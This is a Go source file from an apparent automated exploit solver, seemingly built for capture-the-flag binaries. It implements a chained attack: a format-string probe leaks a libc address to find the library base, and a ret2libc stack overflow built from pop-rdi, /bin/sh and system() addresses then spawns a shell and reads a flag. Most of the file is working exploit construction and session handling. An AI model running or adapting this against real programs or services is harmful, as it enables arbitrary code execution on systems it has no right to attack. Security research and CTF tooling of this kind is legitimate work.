package solve

import (
	"bytes"
	"context"
	"debug/elf"
	"fmt"

	"github.com/MoriartyPuth/PwnProbes/internal/runner"
)

// This file implements chain-as-unit execution (roadmap §30.1): running a
// multi-step composed chain as one flow, where an earlier step establishes a
// primitive that a later step consumes — the thing single-strategy recipes
// cannot do. The concrete case is a class none of them solve: a target that
// discloses a libc address only after it is prompted (a format-string read), and
// has a separate overflow. The leak step sends the trigger, fingerprints the
// libc base, and records it as shared Knowledge and an established primitive; the
// exploit step consumes that base in a ret2libc overflow — all in one session.
//
// It is registered as an expensive strategy, so PR 6's ranking defers it behind
// every cheaper technique: on a target a direct recipe solves, this never runs.
// It earns its place only on the composed class, where nothing else applies.

const (
	maxLeakPos      = 24   // format-string argument positions to probe for a libc pointer
	maxChainAttempt = 1200 // overall connection cap for the composed chain
)

// ret2libcResolved is the static material the ret2libc step needs, resolved once.
type ret2libcResolved struct {
	popRDI   uint64
	hasRet   bool
	ret      uint64
	sysOff   uint64
	binshOff uint64
	syms     map[string]uint64
}

// resolveRet2libc gathers the gadgets and libc offsets for the chain, without
// executing the target.
func (s *solver) resolveRet2libc() (ret2libcResolved, bool) {
	var rr ret2libcResolved
	if s.report.Binary.Bits != 64 {
		return rr, false
	}
	f, err := elf.Open(s.path)
	if err != nil {
		return rr, false
	}
	popRDI, okRDI := findGadget(f, []byte{0x5f, 0xc3}) // pop rdi; ret
	ret, haveRet := retGadget(f)
	f.Close()
	if !okRDI {
		return rr, false
	}
	sysOff, binshOff, ok := s.resolveLibcCached()
	if !ok {
		return rr, false
	}
	return ret2libcResolved{popRDI: popRDI, hasRet: haveRet, ret: ret, sysOff: sysOff, binshOff: binshOff, syms: s.libcSymbols()}, true
}

// chainLeakRet2libcStrategy solves the composed class: prompt a format-string
// leak of a libc address, establish the base, then ret2libc. It applies only to
// an NX, non-PIE target with a confirmed format string and a pop-rdi gadget —
// otherwise it skips (so it wastes nothing where it cannot help).
func (s *solver) chainLeakRet2libcStrategy(ctx context.Context) (bool, error) {
	bin := s.report.Binary
	if bin.Bits != 64 || bin.Protections["pie"].Status == "enabled" || bin.Protections["nx"].Status != "enabled" {
		return false, nil
	}
	if !hasFormatString(s.report.Detection) {
		return false, nil // the leak step needs a confirmed format-string read
	}
	rr, ok := s.resolveRet2libc()
	if !ok {
		return false, nil
	}
	return s.runLeakRet2libc(ctx, rr)
}

// runLeakRet2libc drives the composed chain: for each candidate format-string
// position and overflow offset, run the leak step then the exploit step in one
// session, until the oracle confirms a flag.
func (s *solver) runLeakRet2libc(ctx context.Context, rr ret2libcResolved) (bool, error) {
	attempts := 0
	for pos := 1; pos <= maxLeakPos; pos++ {
		for _, off := range leakOffsets() {
			for _, align := range []bool{false, true} {
				if align && !rr.hasRet {
					continue
				}
				if err := ctx.Err(); err != nil {
					return false, err
				}
				if attempts >= maxChainAttempt {
					return false, nil
				}
				attempts++
				done, err := s.leakThenRet2libc(ctx, pos, off, align, rr)
				if err != nil || done {
					return done, err
				}
			}
		}
	}
	s.report.Limitations = append(s.report.Limitations, "chain_leak_ret2libc: could not leak a libc address via format string and ret2libc within the attempt budget")
	return false, nil
}

// leakThenRet2libc is one composed attempt over a single connection: step 1 sends
// a format-string trigger and establishes the libc base (recording it as shared
// Knowledge and a primitive); step 2 consumes that base in a ret2libc overflow.
func (s *solver) leakThenRet2libc(ctx context.Context, pos, off int, align bool, rr ret2libcResolved) (bool, error) {
	conn, cleanup, err := s.open(ctx)
	if err != nil {
		return false, err
	}
	defer cleanup()
	defer conn.Close()

	pre := conn.RecvUntilIdle(s.idle())
	// Step 1: trigger the leak and establish the base.
	trigger := []byte(fmt.Sprintf("%%%d$p\n", pos))
	if err := conn.Send(trigger); err != nil {
		return false, nil
	}
	resp := conn.RecvUntilIdle(s.idle())
	base, ok := s.libcBaseFor(parseLeaks(string(resp)), rr.syms)
	if !ok {
		return false, nil
	}
	// Step 2: consume the established base in a ret2libc overflow.
	payload := bytes.Repeat([]byte("A"), off)
	payload = append(payload, qword(rr.popRDI)...)
	payload = append(payload, qword(base+rr.binshOff)...)
	if align {
		payload = append(payload, qword(rr.ret)...)
	}
	payload = append(payload, qword(base+rr.sysOff)...)
	if bytes.IndexByte(payload, '\n') >= 0 {
		return false, nil
	}
	line := append(payload, '\n')
	if err := conn.Send(line); err != nil {
		return false, nil
	}
	mid := conn.RecvUntilIdle(s.idle())
	_ = conn.Send([]byte(driveShell))
	post := conn.RecvUntilIdle(s.idle())
	out := string(pre) + string(resp) + string(mid) + string(post)

	input := append(append(append([]byte{}, trigger...), line...), []byte(driveShell)...)
	cands := s.ex.Find(out, input, "chain")
	note := fmt.Sprintf("leak %%%d$p -> base=%#x, ret2libc padding=%d align=%v", pos, base, off, align)
	return s.finalize("chain_leak_ret2libc", note, input, runner.Result{Outcome: "session", ExitCode: -1, Stdout: out}, cands), nil
}

// libcBaseFor establishes the libc base from leaked values, or reuses one already
// in shared Knowledge (so a base another step/strategy established is not
// re-derived). On first establishment it records the base as Knowledge, as an
// intermediate leak finding, and as a libc-domain leak primitive — making the
// chain's first step first-class evidence that the second step consumes.
func (s *solver) libcBaseFor(leaks []uint64, syms map[string]uint64) (uint64, bool) {
	if s.tc != nil && s.tc.Knowledge.LibcBase != nil {
		return *s.tc.Knowledge.LibcBase, true // reuse an already-established base
	}
	base, ok := resolveBaseFromLeaks(leaks, syms)
	if !ok {
		return 0, false
	}
	if s.tc != nil {
		b := base
		s.tc.Knowledge.LibcBase = &b
		fid := findingID("chain", "libc_base", len(s.tc.Findings))
		s.tc.addFinding(Finding{
			ID:         fid,
			Kind:       FindingLeak,
			Status:     StatusConfirmed,
			Confidence: 1.0,
			Source:     "chain_leak_ret2libc",
			Evidence:   []Observation{{Type: "libc_base", Value: fmt.Sprintf("%#x", base)}},
		})
		s.tc.addPrimitive(Primitive{
			ID:         primitiveID(s.tc, PrimitiveLeak),
			Kind:       PrimitiveLeak,
			Status:     StatusPrimitiveEstablished,
			Source:     "chain_leak_ret2libc",
			Domain:     DomainLibc,
			Controlled: true,
			Width:      s.tc.pointerWidth(),
			Repeatable: true,
			Evidence:   []string{fid},
			Note:       "libc base established by a format-string leak, consumed by ret2libc",
		})
	}
	return base, true
}
